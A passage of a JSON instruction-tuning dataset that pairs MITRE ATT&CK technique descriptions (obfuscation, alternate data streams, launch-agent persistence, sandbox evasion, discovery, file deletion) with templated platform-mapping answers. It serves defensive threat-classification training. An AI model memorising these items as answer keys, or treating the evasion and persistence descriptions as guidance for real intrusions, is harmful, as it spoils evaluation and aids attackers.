      "question": "Which platforms are related to the following technique description: Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.",
      "answer": "The provided description is related to MITRE technique Automated Exfiltration (T1020);\nTechnique Automated Exfiltration (T1020) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  Within MFT entries are file attributes,  such as Extended Attributes (EA) and Data known as Alternate Data Streams (ADSs) when more than one Data attribute is present, that can be used to store arbitrary data (and even complete files).    \n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Hide Artifacts: NTFS File Attributes (T1564.004);\nTechnique Hide Artifacts: NTFS File Attributes (T1564.004) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  Within MFT entries are file attributes,  such as Extended Attributes (EA) and Data known as Alternate Data Streams (ADSs) when more than one Data attribute is present, that can be used to store arbitrary data (and even complete files).    \n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.",
      "answer": "The provided description is related to MITRE technique Hide Artifacts: NTFS File Attributes (T1564.004);\nTechnique Hide Artifacts: NTFS File Attributes (T1564.004) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
    "context": "",
    "output": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
      "answer": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "context": "",
    "output": "The provided description is related to MITRE technique Data Manipulation: Transmitted Data Manipulation (T1565.002);\nTechnique Data Manipulation: Transmitted Data Manipulation (T1565.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
      "answer": "The provided description is related to MITRE technique Data Manipulation: Transmitted Data Manipulation (T1565.002);\nTechnique Data Manipulation: Transmitted Data Manipulation (T1565.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Unix Shell (T1059.004);\nTechnique Command and Scripting Interpreter: Unix Shell (T1059.004) is applicable to platforms: Network,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Unix Shell (T1059.004);\nTechnique Command and Scripting Interpreter: Unix Shell (T1059.004) is applicable to platforms: Network,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. \n\nThis functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments.",
    "context": "",
    "output": "The provided description is related to MITRE technique Automated Collection (T1119);\nTechnique Automated Collection (T1119) is applicable to platforms: Linux,  SaaS,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  SaaS,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. \n\nThis functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments.",
      "answer": "The provided description is related to MITRE technique Automated Collection (T1119);\nTechnique Automated Collection (T1119) is applicable to platforms: Linux,  SaaS,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  SaaS,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
    "context": "",
    "output": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
      "answer": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "answer": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.  Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time. Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\n\n Launch Agents can also be executed using the Launchctl command.\n \nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>. The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.",
    "context": "",
    "output": "The provided description is related to MITRE technique Create or Modify System Process: Launch Agent (T1543.001);\nTechnique Create or Modify System Process: Launch Agent (T1543.001) is applicable to platforms: macOS;\nTherefore, the given procedure description is related to platforms: macOS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.  Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time. Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\n\n Launch Agents can also be executed using the Launchctl command.\n \nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>. The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.",
      "answer": "The provided description is related to MITRE technique Create or Modify System Process: Launch Agent (T1543.001);\nTechnique Create or Modify System Process: Launch Agent (T1543.001) is applicable to platforms: macOS;\nTherefore, the given procedure description is related to platforms: macOS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).?",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Visual Basic (T1059.005);\nTechnique Command and Scripting Interpreter: Visual Basic (T1059.005) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Visual Basic (T1059.005);\nTechnique Command and Scripting Interpreter: Visual Basic (T1059.005) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\n\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
    "context": "",
    "output": "The provided description is related to MITRE technique Virtualization/Sandbox Evasion (T1497);\nTechnique Virtualization/Sandbox Evasion (T1497) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\n\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
      "answer": "The provided description is related to MITRE technique Virtualization/Sandbox Evasion (T1497);\nTechnique Virtualization/Sandbox Evasion (T1497) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phishing. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information: Compile After Delivery (T1027.004);\nTechnique Obfuscated Files or Information: Compile After Delivery (T1027.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phishing. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information: Compile After Delivery (T1027.004);\nTechnique Obfuscated Files or Information: Compile After Delivery (T1027.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "answer": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
